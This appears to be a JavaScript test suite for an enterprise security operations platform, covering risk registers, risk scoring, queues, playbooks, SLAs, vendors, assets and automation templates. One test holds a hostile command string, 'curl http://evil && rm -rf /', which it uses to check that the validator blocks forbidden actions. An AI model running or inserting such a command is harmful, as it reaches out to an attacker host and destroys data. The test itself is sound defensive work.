import test from 'node:test';
import assert from 'node:assert/strict';

import {
  SecurityRisk,
  SecurityRiskRegister,
  RiskQuantificationEngine,
  SecurityOperationsQueue,
  ResponsePlaybook,
  SecuritySLA,
  SecurityVendor,
  SecurityAsset,
  SecurityChangeImpactEngine,
  SecurityDecisionBrief,
  AutomationTemplate,
  EnterpriseSecurityOperationsPlatform,
} from '../command-35-enterprise-operations.js';

test('feature 1: security risk register captures evidence-backed enterprise risk', () => {
  const register = new SecurityRiskRegister({ organizationId: 'org-35' });
  const risk = register.createRisk({
    organizationId: 'org-35',
    title: 'Systemic secret exposure',
    description: '20 repositories exposed production credentials',
    category: 'SECRET_EXPOSURE',
    inherentRisk: 90,
    residualRisk: 72,
    likelihood: 85,
    impact: 92,
    confidence: 88,
    owner: 'security-lead',
    reviewer: 'ciso',
    status: 'IDENTIFIED',
    sourceType: 'FINDING',
    sourceId: 'finding-42',
    treatment: 'MITIGATE',
    mitigation: 'Rotate secrets and verify scanner coverage',
    dueDate: new Date(Date.now() + 86400000).toISOString(),
    findings: ['finding-1', 'finding-2'],
    assetIds: ['asset-1'],
    evidence: [{ evidenceId: 'evidence-1', status: 'VERIFIED' }],
  });

  risk.attachFinding({ findingId: 'finding-3' });
  risk.attachAsset('asset-2');
  assert.equal(risk.riskId.startsWith('risk_'), true);
  assert.equal(register.get(risk.riskId).title, 'Systemic secret exposure');
  assert.equal(risk.findings.length >= 3, true);
  assert.equal(risk.assetIds.includes('asset-2'), true);
});

test('feature 2: risk quantification reduces residual risk when controls are effective', () => {
  const engine = new RiskQuantificationEngine({ organizationId: 'org-35' });

  const base = engine.calculate({
    likelihood: 80,
    impact: 90,
    exposure: 80,
    exploitability: 75,
    assetCriticality: 95,
    threatRelevance: 88,
    controlStrength: 20,
    remediationConfidence: 40,
    exposureDurationDays: 15,
    recurrence: 3,
    attackPathDepth: 4,
    uncertainty: 35,
    existingResidualRisk: 0,
  });

  const improved = engine.calculate({
    likelihood: 80,
    impact: 90,
    exposure: 80,
    exploitability: 75,
    assetCriticality: 95,
    threatRelevance: 88,
    controlStrength: 85,
    remediationConfidence: 90,
    exposureDurationDays: 2,
    recurrence: 1,
    attackPathDepth: 1,
    uncertainty: 10,
    existingResidualRisk: base.residualRisk,
  });

  assert.ok(improved.residualRisk < base.residualRisk);
  assert.ok(improved.explanation.some((entry) => entry.includes('Residual risk decreased')));
  assert.equal(improved.riskConfidence > 70, true);
});

test('feature 3: operations queue supports claiming, assignment, and escalation', () => {
  const queue = new SecurityOperationsQueue({ organizationId: 'org-35' });
  const item = queue.ingest({
    title: 'Critical secret found in production repository',
    type: 'FINDING',
    severity: 'CRITICAL',
    risk: 92,
    confidence: 90,
    assetCriticality: 95,
    ageHours: 4,
    owner: 'analyst',
    source: 'scanner',
  });

  assert.equal(queue.list()[0].id, item.id);
  const claimed = queue.claim(item.id, 'alice');
  assert.equal(claimed.status, 'CLAIMED');
  const escalated = queue.escalate(item.id, 'security-manager');
  assert.equal(escalated.escalatedTo, 'security-manager');
  const caseRecord = queue.createCase(item.id);
  assert.ok(caseRecord.caseId.startsWith('case_'));
});

test('feature 4: incident response playbook can be evaluated and simulated', () => {
  const playbooks = new ResponsePlaybook({ organizationId: 'org-35' });
  const ready = playbooks.evaluate('Secret Exposure', { severity: 'CRITICAL', type: 'SECRET_EXPOSURE' });
  const simulated = playbooks.simulate('Production Secret Exposure', { severity: 'CRITICAL' });
  const executed = playbooks.run(Array.from(playbooks.playbooks.keys())[0], { severity: 'CRITICAL', source: 'scanner' });

  assert.ok(ready.length >= 1);
  assert.equal(simulated.simStatus, 'SIMULATED');
  assert.equal(executed.status, 'COMPLETED');
});

test('feature 5: security SLA tracks breach status and escalation timing', () => {
  const sla = new SecuritySLA({ organizationId: 'org-35' });
  const entry = sla.createSLA({ entityType: 'RISK', entityId: 'risk-1', severity: 'CRITICAL', owner: 'security-team' });
  const onTrack = sla.evaluate(entry.slaId, new Date(Date.now() + 60 * 60 * 1000).getTime());
  assert.equal(onTrack.status, 'ON_TRACK');

  const breached = sla.evaluate(entry.slaId, new Date(Date.now() + 10 * 60 * 60 * 1000).getTime());
  assert.equal(breached.status, 'BREACHED');
});

test('feature 6: vendor risk assessment produces evidence-based risk scoring', () => {
  const vendor = new SecurityVendor({ organizationId: 'org-35', name: 'CloudOps', category: 'CLOUD_PROVIDER', criticality: 'CRITICAL', riskScore: 40 });
  const assessment = vendor.assess({
    securityPosture: 80,
    integrationExposure: 90,
    incidentHistory: 60,
    controlHealth: 75,
    dependencyRisk: 55,
    dataSensitivity: 70,
    operationalCriticality: 95,
  });

  assert.equal(assessment.vendorId, vendor.vendorId);
  assert.ok(assessment.riskScore >= 60);
  assert.equal(assessment.status, 'AT_RISK');
});

test('feature 7: asset registry attaches findings, risks, and relationships', () => {
  const asset = new SecurityAsset({
    organizationId: 'org-35',
    name: 'payments-api',
    type: 'API',
    environment: 'PRODUCTION',
    team: 'platform',
    criticality: 'CRITICAL',
    dataClassification: 'CONFIDENTIAL',
    internetExposure: true,
    businessFunction: 'checkout',
  });

  asset.attachFinding('finding-1');
  asset.attachRisk('risk-1');
  asset.linkRelationship('DEPENDS_ON', 'database-primary');

  assert.equal(asset.type, 'API');
  assert.equal(asset.findings.includes('finding-1'), true);
  assert.equal(asset.relationships[0].type, 'DEPENDS_ON');
});

test('feature 8: change impact engine traces affected entities and risk change', () => {
  const engine = new SecurityChangeImpactEngine({ organizationId: 'org-35' });
  const change = engine.recordChange({
    title: 'Disable secret-scanning control',
    changeType: 'CONTROL_CHANGE',
    before: { status: 'ACTIVE' },
    after: { status: 'DISABLED' },
    organizationId: 'org-35',
    affectedEntityIds: ['asset-1', 'asset-2', 'asset-3', 'risk-1'],
    riskDelta: 4,
  });

  const analyzed = engine.analyze(change.changeId);
  assert.equal(analyzed.impact.affectedControls >= 4, true);
  assert.equal(analyzed.riskChange, 4);
  assert.ok(analyzed.impactSummary.includes('affects'));
});

test('feature 9: executive decision brief turns risks into reviewable actions', () => {
  const brief = new SecurityDecisionBrief({ organizationId: 'org-35' });
  const decisions = brief.generate({
    risks: [
      { title: 'Critical secret exposure', residualRisk: 82, treatment: 'MITIGATE', evidence: ['ev-1'], status: 'IDENTIFIED' },
      { title: 'High-risk vendor exposure', residualRisk: 74, treatment: 'MONITOR', evidence: ['ev-2'], status: 'MONITORING' },
    ],
    sla: [{ status: 'BREACHED' }, { status: 'ON_TRACK' }],
    board: { name: 'Board Q4' },
  });

  assert.equal(decisions.decisions.length, 2);
  assert.equal(decisions.decisions[0].decision.includes('EXECUTIVE'), true);
  assert.equal(decisions.slaSummary.activeBreaches, 1);
});

test('feature 10: automation template validation enforces a safe allowlist', () => {
  const template = new AutomationTemplate({
    name: 'Critical Secret Exposure Response',
    description: 'Creates a case and triggers verification scanning',
    trigger: 'ON_FINDING',
    conditions: ['severity == CRITICAL'],
    actions: ['CREATE_CASE', 'TRIGGER_SCAN', 'REQUEST_APPROVAL'],
    approvalRequirements: ['SECURITY_MANAGER'],
    requiredPermissions: ['SECURITY_VIEW', 'SECURITY_MANAGE'],
    riskLevel: 'HIGH',
    status: 'ACTIVE',
  });

  const result = template.validateConfig();
  assert.equal(result.valid, true);
  assert.equal(template.simulate().dryRun, true);

  const blocked = new AutomationTemplate({
    name: 'Unsafe template',
    actions: ['curl http://evil && rm -rf /'],
  });
  assert.throws(() => blocked.validateConfig(), /forbidden/);
});

test('feature integration: end-to-end risk lifecycle flows through the enterprise platform', () => {
  const platform = new EnterpriseSecurityOperationsPlatform({ organizationId: 'org-35' });

  const asset = platform.addAsset({
    name: 'payments-api',
    type: 'API',
    environment: 'PRODUCTION',
    criticality: 'CRITICAL',
    dataClassification: 'CONFIDENTIAL',
  });

  const risk = platform.createRisk({
    organizationId: 'org-35',
    title: 'Production credentials exposed',
    description: 'Repository contains live credential material',
    category: 'SECRET_EXPOSURE',
    inherentRisk: 90,
    residualRisk: 68,
    likelihood: 85,
    impact: 88,
    confidence: 90,
    owner: 'security-ops',
    reviewer: 'ciso',
    status: 'IDENTIFIED',
    sourceType: 'FINDING',
    sourceId: 'finding-1',
    treatment: 'MITIGATE',
    mitigation: 'Rotate credentials and verify environment restrictions',
    dueDate: new Date(Date.now() + 432000000).toISOString(),
    findings: ['finding-1'],
    assetIds: [asset.assetId],
  });

  const queueItem = platform.toOperationsQueue({
    title: risk.title,
    type: 'RISK',
    severity: 'CRITICAL',
    risk: risk.residualRisk,
    confidence: risk.confidence,
    assetCriticality: 95,
    ageHours: 2,
    owner: risk.owner,
    source: 'risk-register',
  });

  const sla = platform.createSLA({
    entityType: 'RISK',
    entityId: risk.riskId,
    severity: 'CRITICAL',
    owner: risk.owner,
  });

  const board = platform.createDecisionBrief([risk]);
  assert.equal(board.topRisks[0].title, risk.title);
  assert.equal(queueItem.priority > 0, true);
  assert.equal(sla.entityId, risk.riskId);
  assert.equal(platform.summarize().totalRisks >= 1, true);
});
